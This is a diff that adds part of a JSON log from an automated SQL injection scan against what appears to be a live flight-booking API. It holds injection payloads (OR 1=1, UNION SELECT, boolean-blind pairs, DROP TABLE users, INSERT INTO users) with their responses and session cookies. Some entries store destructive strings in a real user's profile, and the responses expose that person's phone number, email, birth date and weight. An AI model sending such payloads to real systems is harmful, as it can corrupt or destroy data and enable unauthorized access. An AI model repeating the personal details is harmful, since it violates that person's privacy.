+    },
+    {
+      "endpoint": "/v1/flight/%27%20OR%201%3D1--",
+      "method": "GET",
+      "test_type": "flight_path_injection",
+      "params": null,
+      "json_data": null,
+      "status_code": 404,
+      "response_length": 9,
+      "elapsed_time": 0.12506675720214844,
+      "response_snippet": "Not Found",
+      "headers": {
+        "content-length": "9",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:13 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"9-0gXL1ngzMqISxa6S1zx3F4wtLyg\"",
+        "set-cookie": "sails.sid=s%3AYgohr5oPrSDmajLyF2L-vtVGxKfFWvFN.8q8KETP9WNbccKQds0Yk9NOkEyhm0xfQyrq9wf0Ti48; Path=/; HttpOnly",
+        "vary": "Accept-Encoding"
+      }
+    },
+    {
+      "endpoint": "/v1/flight/%27%20OR%20%27x%27%3D%27x",
+      "method": "GET",
+      "test_type": "flight_path_injection",
+      "params": null,
+      "json_data": null,
+      "status_code": 404,
+      "response_length": 9,
+      "elapsed_time": 0.1223917007446289,
+      "response_snippet": "Not Found",
+      "headers": {
+        "content-length": "9",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:13 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"9-0gXL1ngzMqISxa6S1zx3F4wtLyg\"",
+        "set-cookie": "sails.sid=s%3AFvVYaGAi3cwUPIAA5lpDhKs42TWulkbG.jlWHfL9gwykUhu4t4fXa1oEKn%2F91MqPmMIoc61BYAAo; Path=/; HttpOnly",
+        "vary": "Accept-Encoding"
+      }
+    },
+    {
+      "endpoint": "/v1/flight/%27%29%20OR%20%28%271%27%3D%271",
+      "method": "GET",
+      "test_type": "flight_path_injection",
+      "params": null,
+      "json_data": null,
+      "status_code": 404,
+      "response_length": 9,
+      "elapsed_time": 0.11933207511901855,
+      "response_snippet": "Not Found",
+      "headers": {
+        "content-length": "9",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:13 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"9-0gXL1ngzMqISxa6S1zx3F4wtLyg\"",
+        "set-cookie": "sails.sid=s%3ATO-SLALpQCG5DFhnfPmWyF9VecKfxGaJ.r%2BfGyX%2FphM%2FI6K198MzkiEiyMWFlR5HcMI08c9qgcmQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding"
+      }
+    },
+    {
+      "endpoint": "/v1/flight/%27%20OR%20%271%27%3D%271%27%20--",
+      "method": "GET",
+      "test_type": "flight_path_injection",
+      "params": null,
+      "json_data": null,
+      "status_code": 404,
+      "response_length": 9,
+      "elapsed_time": 0.12204265594482422,
+      "response_snippet": "Not Found",
+      "headers": {
+        "content-length": "9",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:14 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"9-0gXL1ngzMqISxa6S1zx3F4wtLyg\"",
+        "set-cookie": "sails.sid=s%3AWyeD66pUi8-NsYI6_o331jnsxO23RT60.uFA3dczLZVRWFa0ZaJKhuYS%2FAkbjuZm3shVQiIH0Wc0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding"
+      }
+    },
+    {
+      "endpoint": "/v2/flight/8800%27%20OR%20%271%27%3D%271/enter",
+      "method": "POST",
+      "test_type": "v2_flight_enter",
+      "params": null,
+      "json_data": null,
+      "status_code": 400,
+      "response_length": 251,
+      "elapsed_time": 0.12524175643920898,
+      "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"id\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v2/flight/8800'%20OR%20'1'='1/enter`) due to 1 missing or invalid parameter.\"}",
+      "headers": {
+        "content-length": "252",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:14 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"fc-00ChDEXRi7le18EboSE2ETurXKI\"",
+        "set-cookie": "sails.sid=s%3Au3SOvZvLigrw_l73tK2N9Wq2xtYf_Ats.znZp%2BcCltmFWS825x%2FHnrqZaVxD8YMFTi4cVfqH0Z0U; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "error"
+      }
+    },
+    {
+      "endpoint": "/v2/flight/8800%3B%20DROP%20TABLE--/enter",
+      "method": "POST",
+      "test_type": "v2_flight_enter",
+      "params": null,
+      "json_data": null,
+      "status_code": 400,
+      "response_length": 254,
+      "elapsed_time": 0.13271641731262207,
+      "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"id\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v2/flight/8800;%20DROP%20TABLE--/enter`) due to 1 missing or invalid parameter.\"}",
+      "headers": {
+        "content-length": "255",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:14 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"ff-GS8eSSDfRagF5MBhbG+cpkhID90\"",
+        "set-cookie": "sails.sid=s%3AkUpWKAfnXYc_basJ7tGKr8f1SVIm2ViV.oqfGkXRQcCAX3LQGd%2BvteYtl%2FURI6a%2FSjR01ekDdQgo; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "error"
+      }
+    },
+    {
+      "endpoint": "/v2/flight/8800%27%20UNION%20SELECT--/enter",
+      "method": "POST",
+      "test_type": "v2_flight_enter",
+      "params": null,
+      "json_data": null,
+      "status_code": 400,
+      "response_length": 256,
+      "elapsed_time": 0.1273508071899414,
+      "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"id\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v2/flight/8800'%20UNION%20SELECT--/enter`) due to 1 missing or invalid parameter.\"}",
+      "headers": {
+        "content-length": "257",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:14 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"101-iz9JXGJoRJ5caXipl3Mz9xIbKPA\"",
+        "set-cookie": "sails.sid=s%3ACxUAQjnSY_7YxqF0LnqMgIVIGUTPq2rz.Ct2FfNLYSPQJx4bPXVqPp0ysSSFiDEnpwF7EfUAvYk0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "error"
+      }
+    },
+    {
+      "endpoint": "/v3/flight",
+      "method": "GET",
+      "test_type": "v3_flight_query",
+      "params": {
+        "includeExpired": "false' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 400,
+      "response_length": 237,
+      "elapsed_time": 0.12481021881103516,
+      "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"includeExpired\\\":\\n  \u00b7 Expecting a boolean, but got a string.\"],\"message\":\"The server could not fulfill this request (`GET /v3/flight`) due to 1 missing or invalid parameter.\"}",
+      "headers": {
+        "content-length": "238",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:14 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"ee-ii9t4LAVHEhm+9N1riSYaM4kJkw\"",
+        "set-cookie": "sails.sid=s%3AV5eSlauqLxPi2guDci1GncOR-iVCdWe7.VGORuGWS8dBqateluHEYhVd8lCBvJejYfO16KZaQRoQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "error"
+      }
+    },
+    {
+      "endpoint": "/v1/flight-history",
+      "method": "GET",
+      "test_type": "flight_history_union",
+      "params": {
+        "userId": "20254' UNION SELECT NULL--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 19520,
+      "elapsed_time": 0.1931610107421875,
+      "response_snippet": "{\"data\":[{\"id\":8797,\"uuid\":\"16355d02-1fa9-42f7-9cc9-2a9858d74691\",\"departDateTime\":\"2025-11-05T17:45:00.000Z\",\"departDateTimeLocal\":\"2025-11-05T12:45\",\"deletedAt\":null,\"updatedAt\":1762297232723,\"closeoutDateTime\":\"2025-11-04T23:00:00.000Z\",\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/d5b4de7d-76de-4ba3-b41c-9860e73e0a5f.png\",\"isConfirmedByWinner\":false,\"status\":2,\"numberOfEntrants\":0,\"tierClassification\":\"cabin+\",\"winner\":null,\"aircraft\":{\"id\":146,\"tail\":\"N714JS\",\"type\":21},\"d",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:14 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"4c40-WlMCBH2HH+7DcbcozfZC2Phriv0\"",
+        "set-cookie": "sails.sid=s%3A_s7jjWHvm5AqKC506SR0l2CX95gyp4rj.47iExLv4m5LFMvB5l7GI7f%2FLZG35qKs9WztAgTZYswc; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight-history",
+      "method": "GET",
+      "test_type": "flight_history_union",
+      "params": {
+        "userId": "20254' UNION SELECT NULL,NULL--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 19520,
+      "elapsed_time": 0.22320961952209473,
+      "response_snippet": "{\"data\":[{\"id\":8797,\"uuid\":\"16355d02-1fa9-42f7-9cc9-2a9858d74691\",\"departDateTime\":\"2025-11-05T17:45:00.000Z\",\"departDateTimeLocal\":\"2025-11-05T12:45\",\"deletedAt\":null,\"updatedAt\":1762297232723,\"closeoutDateTime\":\"2025-11-04T23:00:00.000Z\",\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/d5b4de7d-76de-4ba3-b41c-9860e73e0a5f.png\",\"isConfirmedByWinner\":false,\"status\":2,\"numberOfEntrants\":0,\"tierClassification\":\"cabin+\",\"winner\":null,\"aircraft\":{\"id\":146,\"tail\":\"N714JS\",\"type\":21},\"d",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:15 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"4c40-WlMCBH2HH+7DcbcozfZC2Phriv0\"",
+        "set-cookie": "sails.sid=s%3AM6D6uTCmBA8o7Pm6S9KAO4EbGMfZkLl-.Q%2FpAbqAIZ1SzgIfNuIZeY9zmk5bK4UkHkqufUY%2BiL5s; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight-history",
+      "method": "GET",
+      "test_type": "flight_history_union",
+      "params": {
+        "userId": "20254' UNION SELECT NULL,NULL,NULL--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 19520,
+      "elapsed_time": 0.18764686584472656,
+      "response_snippet": "{\"data\":[{\"id\":8797,\"uuid\":\"16355d02-1fa9-42f7-9cc9-2a9858d74691\",\"departDateTime\":\"2025-11-05T17:45:00.000Z\",\"departDateTimeLocal\":\"2025-11-05T12:45\",\"deletedAt\":null,\"updatedAt\":1762297232723,\"closeoutDateTime\":\"2025-11-04T23:00:00.000Z\",\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/d5b4de7d-76de-4ba3-b41c-9860e73e0a5f.png\",\"isConfirmedByWinner\":false,\"status\":2,\"numberOfEntrants\":0,\"tierClassification\":\"cabin+\",\"winner\":null,\"aircraft\":{\"id\":146,\"tail\":\"N714JS\",\"type\":21},\"d",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:15 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"4c40-WlMCBH2HH+7DcbcozfZC2Phriv0\"",
+        "set-cookie": "sails.sid=s%3AJ3wa3PBsIpxHFNIw4zwEu6lgCzohpyok.tAyuv7xfAtIvHeBLQajls5orD1J5nfrlyHQBrUMe2gg; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "boolean_blind_true",
+      "params": {
+        "id": "8800' AND '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.8823976516723633,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:17 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-o3ihqLicV9enzq6bZBiy1AnSE8A\"",
+        "set-cookie": "sails.sid=s%3A7tX1RuT6wMijyIool_lrSpJuO49Pf1n4.FOh14eXtLM1fynbKOaLJ8zGB8%2BX3oBQ3AMLxyGrHLYg; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "boolean_blind_false",
+      "params": {
+        "id": "8800' AND '1'='2"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.8175878524780273,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:19 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-zRYNDqWkLDggyg8WVoRT3Fw5eeQ\"",
+        "set-cookie": "sails.sid=s%3ALVks99QacF3mCObgjaQbsa3tS0ayslI9.B6DosOSXsscfG6deJ4liGK1IejQC5%2B5aLeAv8n%2Ffl9g; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "boolean_blind_true",
+      "params": {
+        "id": "8800' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.751976728439331,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:21 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-zRYNDqWkLDggyg8WVoRT3Fw5eeQ\"",
+        "set-cookie": "sails.sid=s%3As7LmTk5v7PakCSlxGgUVzNea_Oek9oGM.ABBGrm%2BwyT9Xf19IKkBVNwBEgTUyFCn4V10%2BP50qgzQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "boolean_blind_false",
+      "params": {
+        "id": "8800' AND 1=2--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.523488998413086,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:23 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-zRYNDqWkLDggyg8WVoRT3Fw5eeQ\"",
+        "set-cookie": "sails.sid=s%3Awleen-TX1M2ELSeQvur9l6rz9txE1zf5.Ap3L5sKfHsVAWJtz4HtPtOl1Qus7Nrat0uXbVsgIhCY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "boolean_blind_true",
+      "params": {
+        "id": "88001' AND 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.4901630878448486,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:24 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-zRYNDqWkLDggyg8WVoRT3Fw5eeQ\"",
+        "set-cookie": "sails.sid=s%3AxpK9D_QLqUY76KIdb90Zam-gasRNY6SG.kTmvut9oDNEATjAzuI4Yf7PXq1EDWFut2bLXnKvelXc; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "boolean_blind_false",
+      "params": {
+        "id": "88001' AND 1=0--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.4741847515106201,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:26 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-zRYNDqWkLDggyg8WVoRT3Fw5eeQ\"",
+        "set-cookie": "sails.sid=s%3Asb14qEL2UOEsGLhR1WRRcJdkh6yXcifq.RAGqoB15wnxta7yBUZCXrFGWqFpwV6rnNeR2ss7%2F6qU; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "second_order_store",
+      "params": null,
+      "json_data": {
+        "firstName": "' OR 1=1--"
+      },
+      "status_code": 200,
+      "response_length": 2068,
+      "elapsed_time": 0.3040931224822998,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364966865,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' OR 1=1--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAcce",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"814-gxtThq+ueq46aC2GrIZK+nepBxM\"",
+        "set-cookie": "sails.sid=s%3Ab_6t7Jbc2qUcovKmviVToxywMXDFhl5Y.pDvqIOLlQzkvsLJawNMk9lKRVSwWRqmDhKNy5FY5pco; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "second_order_trigger",
+      "params": null,
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3179,
+      "elapsed_time": 0.18456077575683594,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364966865,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' OR 1=1--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAcce",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c6b-lQ4YYtmG6nKNBVrJcEog4OnKGWE\"",
+        "set-cookie": "sails.sid=s%3At8735sw-wnyYU6QrdJQMFzCHw2n3qC5-.4p%2BnFoGe6ZBa6oXu81ryl2ZGVF7r3mF212MPuPtFUIY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight-history",
+      "method": "GET",
+      "test_type": "second_order_history_trigger",
+      "params": null,
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 19520,
+      "elapsed_time": 0.18399477005004883,
+      "response_snippet": "{\"data\":[{\"id\":8797,\"uuid\":\"16355d02-1fa9-42f7-9cc9-2a9858d74691\",\"departDateTime\":\"2025-11-05T17:45:00.000Z\",\"departDateTimeLocal\":\"2025-11-05T12:45\",\"deletedAt\":null,\"updatedAt\":1762297232723,\"closeoutDateTime\":\"2025-11-04T23:00:00.000Z\",\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/d5b4de7d-76de-4ba3-b41c-9860e73e0a5f.png\",\"isConfirmedByWinner\":false,\"status\":2,\"numberOfEntrants\":0,\"tierClassification\":\"cabin+\",\"winner\":null,\"aircraft\":{\"id\":146,\"tail\":\"N714JS\",\"type\":21},\"d",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"4c40-WlMCBH2HH+7DcbcozfZC2Phriv0\"",
+        "set-cookie": "sails.sid=s%3Ag1nJztM3suSaIbzVdrcMcBcXVSyTzXiw.TpT9pgf%2FG7UebJs%2BMb8r%2FMAsOoEBZbL4Z0eRUuRss0M; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "second_order_store",
+      "params": null,
+      "json_data": {
+        "firstName": "'; DROP TABLE users--"
+      },
+      "status_code": 200,
+      "response_length": 2079,
+      "elapsed_time": 0.309096097946167,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364968544,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"'; DROP TABLE users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"81f-jW83UG+mE+jDnwY6mSoBEA/J+8U\"",
+        "set-cookie": "sails.sid=s%3AHsRCT4Obj2JZIuOP0E5f44ejBL-ZGczH.XLPrMjA3gOrE1zlNyO0TzjgmV8Kg65%2Fl8FTvL30SYNQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "second_order_trigger",
+      "params": null,
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3190,
+      "elapsed_time": 0.1777184009552002,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364968544,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"'; DROP TABLE users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:29 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c76-6tsjxe2a3wEe/fW/HqAfLZ5su1M\"",
+        "set-cookie": "sails.sid=s%3AMvcVVx_EESYBJ5S1h5CMP5T-VoO48JYR.ErVOFVO3DyKwk16oHOHrchWSRaB%2F4CxqwAIaeR1QE%2FA; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight-history",
+      "method": "GET",
+      "test_type": "second_order_history_trigger",
+      "params": null,
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 19520,
+      "elapsed_time": 0.19780206680297852,
